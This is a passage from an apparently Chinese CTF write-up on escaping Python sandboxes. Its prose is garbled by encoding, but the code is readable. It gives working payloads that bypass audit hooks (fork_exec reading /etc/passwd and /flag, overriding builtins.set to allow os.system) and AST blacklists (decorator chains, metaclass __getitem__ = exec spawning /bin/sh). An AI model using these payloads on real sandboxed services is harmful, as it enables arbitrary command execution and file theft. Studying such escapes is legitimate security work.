<code>__loader__.load_module(fullname)</code>  å¯ä»¥å¾—åˆ°æœ€ç»ˆçš„ payload:</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__loader__.load_module(<span class="string">&#x27;_posixsubprocess&#x27;</span>).fork_exec([<span class="string">b&quot;/bin/cat&quot;</span>,<span class="string">&quot;/etc/passwd&quot;</span>], [<span class="string">b&quot;/bin/cat&quot;</span>], <span class="literal">True</span>, (), <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, *(__loader__.load_module(<span class="string">&#x27;os&#x27;</span>).pipe()), <span class="literal">False</span>, <span class="literal">False</span>,<span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, <span class="literal">None</span>, <span class="literal">False</span>)</span><br></pre></td></tr></table></figure></div><p>å¯ä»¥çœ‹åˆ°å…¨ç¨‹è§¦å‘äº†  <code>builtins.input/result</code> , compile, exec ä¸‰ä¸ª hook, è¿™äº› hook çš„è§¦å‘éƒ½æ˜¯å› ä¸º input, compile, exec å‡½æ•°è€Œè§¦å‘çš„ï¼Œ <code>__loader__.load_module</code>  å’Œ  <code>_posixsubprocess</code>  éƒ½æ²¡æœ‰è§¦å‘.</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] builtins.input/result, (&#x27;__loader__.load_module(\&#x27;_posixsubprocess\&#x27;).fork_exec([b&quot;/bin/cat&quot;,&quot;/flag&quot;], [b&quot;/bin/cat&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__loader__.load_module(\&#x27;os\&#x27;).pipe()), False, False,False, None, None, None, -1, None, False)&#x27;,)</span><br><span class="line">[+] compile, (b&#x27;__loader__.load_module(\&#x27;_posixsubprocess\&#x27;).fork_exec([b&quot;/bin/cat&quot;,&quot;/flag&quot;], [b&quot;/bin/cat&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__loader__.load_module(\&#x27;os\&#x27;).pipe()), False, False,False, None, None, None, -1, None, False)&#x27;, &#x27;&lt;string&gt;&#x27;)</span><br><span class="line">[+] exec, (&lt;code object &lt;module&gt; at 0x7fbecc924670, file &quot;&lt;string&gt;&quot;, line 1&gt;,)</span><br></pre></td></tr></table></figure></div><h4 id="__loader__load_module-å¯¼å…¥æ¨¡å—"><a class="markdownIt-Anchor" href="#__loader__load_module-å¯¼å…¥æ¨¡å—">#</a>  <code>__loader__.load_module</code>  å¯¼å…¥æ¨¡å—</h4><p><code>__loader__.load_module(fullname)</code>  ä¹Ÿæ˜¯ python ä¸­ç”¨äºå¯¼å…¥æ¨¡å—çš„ä¸€ä¸ªæ–¹æ³•å¹¶ä¸”ä¸éœ€è¦å¯¼å…¥å…¶ä»–ä»»ä½•åº“.</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__loader__.load_module(<span class="string">&#x27;os&#x27;</span>)</span><br></pre></td></tr></table></figure></div><p><code>__loader__</code>  å®é™…ä¸ŠæŒ‡å‘çš„æ˜¯  <code>_frozen_importlib.BuiltinImporter</code>  ç±»ï¼Œä¹Ÿå¯ä»¥é€šè¿‡åˆ«çš„æ–¹å¼è¿›è¡Œè·å–</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; ().__class__.__base__.__subclasses__()[84]</span></span><br><span class="line">&lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; __loader__</span></span><br><span class="line">&lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; ().__class__.__base__.__subclasses__()[84].__name__</span></span><br><span class="line">&#x27;BuiltinImporter&#x27;</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; [x <span class="keyword">for</span> x <span class="keyword">in</span> ().__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&#x27;BuiltinImporter&#x27;</span> <span class="keyword">in</span> x.__name__][0]</span></span><br><span class="line">&lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;</span><br></pre></td></tr></table></figure></div><p><code>__loader__.load_module</code>  ä¹Ÿæœ‰ä¸€ä¸ªç¼ºç‚¹å°±æ˜¯<strong>æ— æ³•å¯¼å…¥éå†…å»ºæ¨¡å—</strong>ï¼Œ ä¾‹å¦‚ socket</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; __loader__.load_module(<span class="string">&#x27;socket&#x27;</span>)</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">  File &quot;&lt;frozen importlib._bootstrap&gt;&quot;, line 290, in _load_module_shim</span><br><span class="line">  File &quot;&lt;frozen importlib._bootstrap&gt;&quot;, line 721, in _load</span><br><span class="line">  File &quot;&lt;frozen importlib._bootstrap&gt;&quot;, line 676, in _load_unlocked</span><br><span class="line">  File &quot;&lt;frozen importlib._bootstrap&gt;&quot;, line 573, in module_from_spec</span><br><span class="line">  File &quot;&lt;frozen importlib._bootstrap&gt;&quot;, line 776, in create_module</span><br><span class="line">ImportError: &#x27;socket&#x27; is not a built-in module</span><br></pre></td></tr></table></figure></div><h4 id="ç¯¡æ”¹å†…ç½®å‡½æ•°"><a class="markdownIt-Anchor" href="#ç¯¡æ”¹å†…ç½®å‡½æ•°">#</a> ç¯¡æ”¹å†…ç½®å‡½æ•°</h4><p>è¿™é“ audit hook é¢˜è¿˜æœ‰ä¸€ä¸ªè§£æ³•ï¼Œå¯ä»¥çœ‹åˆ° WHITE_EVENT æ˜¯é€šè¿‡ set å‡½æ•°è¿”å›çš„ï¼Œset å‡½æ•°ä½œä¸ºä¸€ä¸ªå†…ç½®å‡½æ•°å®é™…ä¸Šä¹Ÿæ˜¯å¯ä»¥è¢«ä¿®æ”¹çš„</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WHITED_EVENTS = <span class="built_in">set</span>(&#123;<span class="string">&#x27;builtins.input&#x27;</span>, <span class="string">&#x27;builtins.input/result&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure></div><p>æ¯”å¦‚æˆ‘ä»¬å°† set å‡½æ•°ä¿®æ”¹ä¸ºå›ºå®šè¿”å›ä¸€ä¸ªåŒ…å«äº† os.system å‡½æ•°çš„åˆ—è¡¨</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.<span class="built_in">set</span> = <span class="keyword">lambda</span> x: [<span class="string">&#x27;builtins.input&#x27;</span>, <span class="string">&#x27;builtins.input/result&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;os.system&#x27;</span>]</span><br></pre></td></tr></table></figure></div><p>è¿™æ · set å‡½æ•°ä¼šå›ºå®šè¿”å›å¸¦æœ‰ os.system çš„åˆ—è¡¨.</p><p>æœ€ç»ˆ payload:</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">exec(&quot;for k,v in enumerate(globals()[&#x27;__builtins__&#x27;]): print(k,v)&quot;)</span><br><span class="line"></span><br><span class="line"># ç¯¡æ”¹å‡½æ•°</span><br><span class="line">exec(&quot;globals()[&#x27;__builtins__&#x27;][&#x27;set&#x27;]=lambda x: [&#x27;builtins.input&#x27;, &#x27;builtins.input/result&#x27;,&#x27;exec&#x27;, &#x27;compile&#x27;, &#x27;os.system&#x27;]\nimport os\nos.system(&#x27;cat flag2.txt&#x27;)&quot;)</span><br></pre></td></tr></table></figure></div><h4 id="å…¶ä»–ä¸è§¦å‘-hook-çš„æ–¹å¼"><a class="markdownIt-Anchor" href="#å…¶ä»–ä¸è§¦å‘-hook-çš„æ–¹å¼">#</a> å…¶ä»–ä¸è§¦å‘ hook çš„æ–¹å¼</h4><p>ä½¿ç”¨  <code>__loader__.load_module('os')</code>  æ˜¯ä¸ºäº†è·å– os æ¨¡å—ï¼Œå…¶å®åœ¨ no builtins åˆ©ç”¨æ‰‹æ³•ä¸­ï¼Œæ— éœ€å¯¼å…¥ä¹Ÿå¯ä»¥è·å–å¯¹åº”æ¨¡å—ã€‚ä¾‹å¦‚:</p><h3 id="ç»•è¿‡-ast-æ²™ç®±"><a class="markdownIt-Anchor" href="#ç»•è¿‡-ast-æ²™ç®±">#</a> ç»•è¿‡ AST æ²™ç®±</h3><p>Python çš„ ast æ¨¡å—æ˜¯ä¸€ä¸ªç”¨äºå¤„ç† Python ä»£ç æŠ½è±¡è¯­æ³•æ ‘ï¼ˆASTï¼‰çš„åº“ã€‚å®ƒæä¾›äº†ä¸€äº›å·¥å…·ï¼Œå¯ä»¥è®©å¼€å‘è€…è½»æ¾åœ°æ£€æŸ¥ã€ä¿®æ”¹å’Œç”Ÿæˆ Python ä»£ç çš„ ASTã€‚</p><p>æŠ½è±¡è¯­æ³•æ ‘æ˜¯ Python æºä»£ç çš„ä¸€ç§æ ‘å½¢è¡¨ç¤ºå½¢å¼ï¼Œç”¨äºè¡¨ç¤º Python ä»£ç çš„è¯­æ³•ç»“æ„ã€‚Python çš„ ast æ¨¡å—å¯ä»¥å°† Python ä»£ç è§£æä¸º ASTï¼Œå¹¶æä¾›äº†è®¸å¤šæ–¹æ³•å’Œå±æ€§ï¼Œä»¥ä¾¿å¼€å‘è€…å¯ä»¥è®¿é—®å’Œä¿®æ”¹ AST èŠ‚ç‚¹ã€‚</p><p>ä»¥ä¸‹æ˜¯ ast æ¨¡å—ä¸­å¸¸ç”¨çš„ä¸€äº›ç±»å’Œæ–¹æ³•ï¼š</p><ol><li>ast.parse(source, filename=â€™<string>â€™, mode=â€˜execâ€™)ï¼šå°†æºä»£ç è§£æä¸º AST å¯¹è±¡ã€‚</string></li><li>ast.dump (node)ï¼šå°† AST èŠ‚ç‚¹è½¬æ¢ä¸ºå­—ç¬¦ä¸²å½¢å¼è¾“å‡ºã€‚</li><li>ast.NodeVisitorï¼šä¸€ä¸ªåŸºç±»ï¼Œå¯ä»¥ç”¨äºéå†å’Œä¿®æ”¹ AST æ ‘ã€‚</li><li>ast.NodeTransformerï¼šä¸€ä¸ªåŸºç±»ï¼Œå¯ä»¥ç”¨äºä¿®æ”¹ AST èŠ‚ç‚¹ã€‚</li><li>ast.Moduleï¼šè¡¨ç¤º Python æ¨¡å—ã€‚</li><li>ast.FunctionDefï¼šè¡¨ç¤º Python å‡½æ•°ã€‚</li><li>ast.ClassDefï¼šè¡¨ç¤º Python ç±»ã€‚</li><li>ast.Assignï¼šè¡¨ç¤º Python çš„èµ‹å€¼è¯­å¥ã€‚</li><li><a class="link" href="http://ast.Name">ast.Name <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>ï¼šè¡¨ç¤º Python çš„å˜é‡åã€‚</li></ol><p>ä½¿ç”¨ ast æ¨¡å—å¯ä»¥è®©å¼€å‘è€…æ–¹ä¾¿åœ°è®¿é—®å’Œä¿®æ”¹ Python ä»£ç çš„è¯­æ³•ç»“æ„ï¼Œä¾‹å¦‚å¯ä»¥ç”¨å®ƒæ¥åˆ†æ Python ä»£ç çš„å¤æ‚åº¦ã€æ£€æŸ¥ä»£ç çš„å®‰å…¨æ€§ã€æå–ä»£ç ä¸­çš„å…³é”®å­—ç­‰ç­‰ã€‚<a class="link" href="https://blog.csdn.net/qq_43705697/article/details/130443928">python ast è¯¦è§£ä¸ç”¨æ³• - CSDN åšå®¢ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>AST æ²™ç®±ä¼šå°†ç”¨æˆ·çš„è¾“å…¥è½¬åŒ–ä¸ºæ“ä½œç ï¼Œæ­¤æ—¶å­—ç¬¦ä¸²å±‚é¢çš„å˜æ¢åŸºæœ¬ä¸Šæ²¡ç”¨äº†ï¼Œä¸€èˆ¬æƒ…å†µä¸‹è€ƒè™‘<strong>ç»•è¿‡ AST é»‘åå•</strong>ã€‚ä¾‹å¦‚ä¸‹é¢çš„æ²™ç®±ç¦æ­¢äº†  <code>ast.Import|ast.ImportFrom|ast.Call</code>  è¿™ä¸‰ç±»æ“ä½œï¼Œè¿™æ ·ä¸€æ¥å°±æ— æ³•å¯¼å…¥æ¨¡å—å’Œæ‰§è¡Œå‡½æ•°.</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_secure</span>(<span class="params">m</span>):</span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> ast.walk(m):</span><br><span class="line">    <span class="keyword">match</span> <span class="built_in">type</span>(x):</span><br><span class="line">      <span class="keyword">case</span> (ast.Import|ast.ImportFrom|ast.Call):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;ERROR: Banned statement <span class="subst">&#123;x&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">abspath = os.path.abspath(__file__)</span><br><span class="line">dname = os.path.dirname(abspath)</span><br><span class="line">os.chdir(dname)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-- Please enter code (last line must contain only --END)&quot;</span>)</span><br><span class="line">source_code = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  line = sys.stdin.readline()</span><br><span class="line">  <span class="keyword">if</span> line.startswith(<span class="string">&quot;--END&quot;</span>):</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  source_code += line</span><br><span class="line"></span><br><span class="line">tree = <span class="built_in">compile</span>(source_code, <span class="string">&quot;input.py&quot;</span>, <span class="string">&#x27;exec&#x27;</span>, flags=ast.PyCF_ONLY_AST)</span><br><span class="line"><span class="keyword">if</span> verify_secure(tree):  <span class="comment"># Safe to execute!</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;-- Executing safe code:&quot;</span>)</span><br><span class="line">  compiled = <span class="built_in">compile</span>(source_code, <span class="string">&quot;input.py&quot;</span>, <span class="string">&#x27;exec&#x27;</span>)</span><br><span class="line">  <span class="built_in">exec</span>(compiled)<span class="comment"># è·å– sys</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;sys&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å– os</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;_sitebuiltins.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) <span class="keyword">and</span> <span class="keyword">not</span> <span class="string">&quot;_Helper&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&quot;sys&quot;</span>].modules[<span class="string">&quot;os&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># å…¶ä»–çš„ payload ä¹Ÿéƒ½ä¸ä¼šè§¦å‘</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>][<span class="string">&quot;system&quot;</span>](<span class="string">&quot;ls&quot;</span>)</span><br></pre></td></tr></table></figure></div><h4 id="without-call"><a class="markdownIt-Anchor" href="#without-call">#</a> without call</h4><p>å¦‚æœåŸºäº AST çš„æ²™ç®±é™åˆ¶äº†æ‰§è¡Œå‡½æ•°ï¼Œé‚£ä¹ˆå°±éœ€è¦æ‰¾åˆ°ä¸€ç§ä¸éœ€è¦æ‰§è¡Œå‡½æ•°çš„æ–¹å¼æ‰§è¡Œç³»ç»Ÿå‘½ä»¤.</p><h5 id="è£…é¥°å™¨"><a class="markdownIt-Anchor" href="#è£…é¥°å™¨">#</a> è£…é¥°å™¨</h5><p>åˆ©ç”¨ payload å¦‚ä¸‹ï¼Œè¯¥ payload å®é™…ä¸Šç­‰æ•ˆäº exec (input (X))</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@exec</span></span><br><span class="line"><span class="meta">@input</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">X</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></div><p>å½“æˆ‘ä»¬è¾“å…¥ä¸Šè¿°çš„ä»£ç åï¼ŒPython ä¼šæ‰“å¼€è¾“å…¥ï¼Œæ­¤æ—¶æˆ‘ä»¬å†è¾“å…¥ payload å°±å¯ä»¥æˆåŠŸæ‰§è¡Œå‘½ä»¤.</p><div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; @<span class="built_in">exec</span></span><br><span class="line">... @input</span><br><span class="line">... class X:</span><br><span class="line">...     pass</span><br><span class="line">... </span><br><span class="line">&lt;class <span class="string">&#x27;__main__.X&#x27;</span>&gt;__import__(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br></pre></td></tr></table></figure></div><p>ç”±äºè£…é¥°å™¨ä¸ä¼šè¢«è§£æä¸ºè°ƒç”¨è¡¨è¾¾å¼æˆ–è¯­å¥ï¼Œå› æ­¤å¯ä»¥ç»•è¿‡é»‘åå•ï¼Œæœ€ç»ˆä¼ å…¥çš„ payload æ˜¯ç”± input æ¥æ”¶çš„ï¼Œå› æ­¤ä¹Ÿä¸ä¼šè¢«æ‹¦æˆª.</p><p>å…¶å®è¿™æ ·çš„è¯ï¼Œæ„é€ å…¶å®å¯ä»¥æœ‰å¾ˆå¤šï¼Œæ¯”å¦‚ä½¿ç”¨å•å±‚çš„è£…é¥°å™¨ï¼Œæ‰“å¼€ help å‡½æ•°.</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@help</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">X</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></div><p>è¿™æ ·å¯ä»¥ç›´æ¥è¿›å…¥å¸®åŠ©æ–‡æ¡£:</p><div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Help on class X <span class="keyword">in</span> module __main__:</span><br><span class="line"></span><br><span class="line">class X(builtins.object)</span><br><span class="line"> |  Data descriptors defined here:</span><br><span class="line"> |  </span><br><span class="line"> |  __dict__</span><br><span class="line"> |      dictionary <span class="keyword">for</span> instance variables (<span class="keyword">if</span> defined)</span><br><span class="line"> |  </span><br><span class="line"> |  __weakref__</span><br><span class="line"> |      list of weak references to the object (<span class="keyword">if</span> defined)</span><br><span class="line">(END)</span><br></pre></td></tr></table></figure></div><p>å†æ¬¡è¾“å…¥ï¼sh å³å¯æ‰“å¼€ /bin/sh</p><p>æˆ–æ˜¯ç»™è£…é¥°å™¨åŠ ä¸€äº›å‚æ•°ã€‚</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fake_wrapper</span>(<span class="params">f</span>):</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@getattr(<span class="params">os,<span class="string">&quot;system&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@fake_wrapper</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">something</span>():</span><br><span class="line">  <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></div><p>ç›¸å½“äºï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getattr(os,&quot;system&quot;)(fake_wrapper(something))</span><br></pre></td></tr></table></figure></div><p>äº¦æˆ–è€…è‡ªå®šä¹‰ä¸€ä¸ªè£…é¥°å™¨ï¼š</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fake_wrapper</span>(<span class="params">f</span>):</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@os.system</span></span><br><span class="line"><span class="meta">@fake_wrapper</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">something</span>():</span><br><span class="line">  <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>ç›¸å½“äº  <code>os.system(fake_wrapper(something))</code> ï¼Œä¹Ÿå°±æ˜¯  <code>os.system(â€˜/bin/shâ€™)</code></p><h5 id="å‡½æ•°è¦†ç›–"><a class="markdownIt-Anchor" href="#å‡½æ•°è¦†ç›–">#</a> å‡½æ•°è¦†ç›–</h5><p>æˆ‘ä»¬çŸ¥é“åœ¨ Python ä¸­è·å–ä¸€ä¸ªçš„å±æ€§ä¾‹å¦‚  <code>obj[argument]</code>  å®é™…ä¸Šæ˜¯è°ƒç”¨çš„  <code>obj.__getitem__</code>  æ–¹æ³•ã€‚å› æ­¤åªéœ€è¦è¦†ç›–å…¶  <code>__getitem__</code>  æ–¹æ³•ï¼Œå³å¯åœ¨ä½¿ç”¨  <code>obj[argument]</code>  æ‰§è¡Œä»£ç :</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line"><span class="meta">... </span>    __getitem__ = <span class="built_in">exec</span></span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>A()[<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>]</span><br></pre></td></tr></table></figure></div><p>ä½†æ˜¯è¿™é‡Œè°ƒç”¨äº† A çš„æ„é€ å‡½æ•°ï¼Œå› æ­¤ AST ä¸­è¿˜æ˜¯ä¼šå‡ºç° ast.Call. å¦‚ä½•åœ¨ä¸æ‰§è¡Œæ„é€ å‡½æ•°çš„æƒ…å†µä¸‹è·å–ç±»å®ä¾‹å‘¢ï¼Ÿ</p><h6 id="metaclass-åˆ©ç”¨"><a class="markdownIt-Anchor" href="#metaclass-åˆ©ç”¨">#</a> metaclass åˆ©ç”¨</h6><p>Python ä¸­æä¾›äº†ä¸€ç§å…ƒç±» (metaclass) æ¦‚å¿µã€‚å…ƒç±»æ˜¯åˆ›å»ºç±»çš„ â€œç±»â€ã€‚åœ¨ Python ä¸­ï¼Œç±»æœ¬èº«ä¹Ÿæ˜¯å¯¹è±¡ï¼Œå…ƒç±»å°±æ˜¯åˆ›å»ºè¿™äº›ç±»ï¼ˆå³ç±»çš„å¯¹è±¡ï¼‰çš„ç±»ã€‚</p><p>å…ƒç±»åœ¨ Python ä¸­çš„ä½œç”¨ä¸»è¦æ˜¯ç”¨æ¥åˆ›å»ºç±»ã€‚ç±»æ˜¯å¯¹è±¡çš„æ¨¡æ¿ï¼Œè€Œå…ƒç±»åˆ™æ˜¯ç±»çš„æ¨¡æ¿ã€‚å…ƒç±»å®šä¹‰äº†ç±»çš„è¡Œä¸ºå’Œå±æ€§ï¼Œå°±åƒç±»å®šä¹‰äº†å¯¹è±¡çš„è¡Œä¸ºå’Œå±æ€§ä¸€æ ·ã€‚</p><p>ä¸‹é¢æ˜¯åŸºäºå…ƒç±»çš„ payload, åœ¨ä¸ä½¿ç”¨æ„é€ å‡½æ•°çš„æƒ…å†µä¸‹è§¦å‘</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Metaclass</span>(<span class="title class_ inherited__">type</span>):</span><br><span class="line">    __getitem__ = <span class="built_in">exec</span> </span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Sub</span>(metaclass=Metaclass):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">Sub[<span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>]</span><br></pre></td></tr></table></figure></div><p>é™¤äº†  <code>__getitem__</code>  ä¹‹å¤–å…¶ä»–æ–¹æ³•çš„åˆ©ç”¨æ–¹å¼å¦‚ä¸‹:</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 